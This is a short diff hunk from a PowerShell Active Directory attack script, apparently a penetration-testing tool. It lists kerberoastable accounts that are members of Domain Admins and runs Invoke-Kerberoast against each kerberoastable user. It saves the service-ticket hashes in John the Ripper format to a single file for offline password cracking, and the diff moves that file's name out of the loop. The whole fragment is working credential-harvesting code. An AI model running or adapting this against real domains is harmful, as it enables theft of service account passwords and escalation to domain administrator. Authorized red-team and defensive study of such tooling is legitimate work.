@@ -364,8 +364,9 @@ Write-Banner -Text "Kerberoastable users members of DA"
 Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_da.csv" | ConvertFrom-Csv
 
 Write-Banner -Text "Kerberoasting all users"
+$TgsRepOutputFile = "$KerberoastDir\tgs_rep_$(New-Guid).txt"
+
 foreach($KerberoastableUser in $KerberoastableUsers){
-    $TgsRepOutputFile = "$KerberoastDir\tgs_rep_$(New-Guid).txt"
     Invoke-Kerberoast -Domain $Domain -Server $PDC.IP4Address -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File -Append "$TgsRepOutputFile"
 }
 Write-Output "[saving into ""$TgsRepOutputFile""]"
